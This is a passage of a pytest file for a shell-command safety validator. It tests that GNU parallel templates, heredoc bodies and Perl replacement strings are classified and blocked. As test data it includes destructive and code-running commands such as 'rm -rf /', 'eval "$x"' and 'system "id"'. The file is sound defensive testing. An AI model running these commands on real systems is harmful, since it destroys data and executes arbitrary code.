            (["timeout 5 env"], True),
            (["nohup xargs"], True),
            (["awk {}"], True),
            (["find . -exec {} ;"], True),
            (["echo {}; ls"], True),  # compound inert template: fails closed
            (["{}"], True),
            (["env"], True),
            (['read x; eval "$x"'], True),  # `--pipe` body
            (["parallel", "echo"], True),  # a nested runner, resolved without a re-parse
            ([":::", "a"], True),  # no template
            (["echo {}"], False),
            (["echo"], False),
            (["gzip -9"], False),
            (["sha256sum {}"], False),
            (["grep foo {}"], False),
            (["echo", ":::", "a"], False),  # `:::` args are not the template
            # Members dropped for an option that runs a program (LAB-5180):
            (["printf %s {}"], True),  # `printf -v arr[$(...)]` evaluates the subscript
            (["sort -S16k"], True),  # `sort --compress-program=X` runs X
            # parallel's own Perl replacement strings run code whatever the head:
            (['echo {= system "id" =}'], True),
            (["echo {= uq =}"], True),
            (["--rpl", "{U} uq", "echo {U}"], True),
        ],
    )
    def test_classifier(self, template, runs_code):
        assert _template_runs_code(template) is runs_code

    def test_hang_template_does_not_reparse(self):
        # A template that reopened bashlex's _paramexpand loop (LAB-4959) must finish and BLOCK. Run
        # it in a subprocess with a timeout, so a regression fails the test instead of hanging the
        # suite (there is no pytest-timeout, LAB-4572).
        command = "rm -rf / ; parallel 'echo \"$(cat <<X\\n${\\nX\\n)\"' ::: a"
        script = (
            "import sys; from schlock.core.validator import validate_command, is_shellcheck_available;\n"
            "import schlock.core.validator as v; v.is_shellcheck_available = lambda: False;\n"
            "r = validate_command(sys.argv[1], _shellcheck=False);\n"
            "print(r.risk_level.name)"
        )
        proc = subprocess.run([sys.executable, "-c", script, command], check=False, capture_output=True, text=True, timeout=60)
        assert proc.returncode == 0, proc.stderr
        assert proc.stdout.strip() == "BLOCKED"

    def test_nested_template_runners_block(self, no_shellcheck):
        # 200 nested `parallel` words resolve to code without a per-level re-parse (no recursion).
        command = "parallel " * 200 + "echo <<'EOF'\n" + Q + "\nEOF"
        result = validate_command(command)
        assert result.risk_level == RiskLevel.BLOCKED
        assert "shell_delegated_payload" in (result.matched_rules or [])


class TestQuotedSubstitutionInProgramNameOverReads:
    """A quote inside `$(...)` in the program word makes `_last_component` return the whole word, so
    it reads as unresolved and the body is scanned as code. Accepted as a rare fail-closed
    over-block; pinned as intended."""

    def test_dangerous_body_blocks(self, no_shellcheck):
        result = validate_command('"$(dirname "$0")/run.sh" <<\'EOF\'\n' + Q + "\nEOF")
        assert result.risk_level == RiskLevel.BLOCKED


class TestParallelPerlReplacement:
    """GNU parallel's `{= perl =}` and `--rpl 'X perl'` run arbitrary Perl in parallel itself,
    regardless of the template head or whether a heredoc is present (LAB-5180)."""

    @pytest.mark.parametrize(
        "command",
        [
            'parallel echo {= system "id" =} ::: a',  # no heredoc: caught as a dangerous construct
            "parallel 'echo {= uq =}' <<EOF\n;rm -rf /\nEOF",
            "parallel --rpl '{U} uq' 'echo {U}' <<'EOF'\n" + Q + "\nEOF",
            "parallel --rpl='{U} uq' 'echo {U}' <<'EOF'\n" + Q + "\nEOF",
        ],
    )
    def test_perl_replacement_blocks(self, command, no_shellcheck):
        assert validate_command(command).risk_level == RiskLevel.BLOCKED, command
